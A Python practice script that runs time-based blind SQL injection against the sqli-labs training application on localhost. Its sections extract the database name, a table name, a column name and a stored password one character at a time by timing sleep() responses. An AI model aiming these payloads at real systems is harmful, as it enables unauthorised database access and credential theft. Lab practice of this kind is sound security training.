# 时间盲注-判断数据库名长度

# import requests
# import time

# url = "http://localhost/sqli-labs/Less-9/"
# ultimate_value = 0
# select="database()"

# for i in range(1, 100):
#     payload = "?id=1' and if(length(database())={},sleep(5),1) --+".format(i)
#     start_time = time.time()
#     response = requests.get(url+payload)
#     end_time = time.time()
#     if end_time - start_time > 4:
#         print(url+payload)
#         ultimate_value = i
#         break
# print("The ultimate value is:", ultimate_value)




# 时间盲注-判断数据库名


# import requests
# import time

# url = "http://localhost/sqli-labs/Less-9/"
# ultimate_value = ""
# select="database()"

# for i in range(1, 100):
#     for ascii in range(32, 128):
#         payload = "?id=1' and if(ascii(substr(database(),{},1))={},sleep(5),1) --+".format(i, ascii)
#         start_time = time.time()
#         response = requests.get(url+payload)
#         end_time = time.time()
#         print(url+payload)
#         if end_time - start_time > 4:
#             ultimate_value += chr(ascii)
#             print(ultimate_value)
#             break
#         if ascii == 127:
#             print("The ultimate value is:", ultimate_value)
#             exit()




# 时间盲注-判断表名

# import requests
# import time

# url = "http://localhost/sqli-labs/Less-9/"
# ultimate_value = ""
# select="(select table_name from information_schema.tables where table_schema='security' limit 3,1)"

# for i in range(1, 100):
#     for ascii in range(32, 128):
#         payload = "?id=1' and if(ascii(substr({},{},1))={},sleep(5),1) --+".format(select, i, ascii)
#         start_time = time.time()
#         response = requests.get(url+payload)
#         end_time = time.time()
#         print(url+payload)
#         if end_time - start_time > 4:
#             ultimate_value += chr(ascii)
#             print(ultimate_value)
#             break
#         if ascii == 127:
#             print("The ultimate value is:", ultimate_value)
#             exit()


# 时间盲注-判断列名

# import requests
# import time

# url = "http://localhost/sqli-labs/Less-9/"
# ultimate_value = ""
# select="(select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 2,1)"

# for i in range(1, 100):
#     for ascii in range(32, 128):
#         payload = "?id=1' and if(ascii(substr({},{},1))={},sleep(5),1) --+".format(select, i, ascii)
#         start_time = time.time()
#         response = requests.get(url+payload)
#         end_time = time.time()
#         print(url+payload)
#         if end_time - start_time > 4:
#             ultimate_value += chr(ascii)
#             print(ultimate_value)
#             break
#         if ascii == 127:
#             print("The ultimate value is:", ultimate_value)
#             exit()


# 时间盲注-判断用户名/密码

# import requests
# import time

# url = "http://localhost/sqli-labs/Less-9/"
# ultimate_value = ""
# select="(select password from users limit 0,1)"

# for i in range(1, 100):
#     for ascii in range(32, 128):
#         payload = "?id=1' and if(ascii(substr({},{},1))={},sleep(5),1) --+".format(select, i, ascii)
#         start_time = time.time()
#         response = requests.get(url+payload)
#         end_time = time.time()
#         print(url+payload)
#         if end_time - start_time > 4:
#             ultimate_value += chr(ascii)
#             print(ultimate_value)
#             break
#         if ascii == 127:
#             print("The ultimate value is:", ultimate_value)
#             exit()


import requests
import time

url = "http://localhost/sqli-labs/Less-10/"
ultimate_value = ""
select="(select password from users limit 0,1)"

for i in range(1, 100):
    for ascii in range(32, 128):
        payload = '?id=1" and if(ascii(substr({},{},1))={},sleep(5),1) --+'.format(select, i, ascii)
        start_time = time.time()
        response = requests.get(url+payload)
        end_time = time.time()
        print(url+payload)
        if end_time - start_time > 4:
            ultimate_value += chr(ascii)
            print(ultimate_value)
            break
        if ascii == 127:
            print("The ultimate value is:", ultimate_value)
            exit()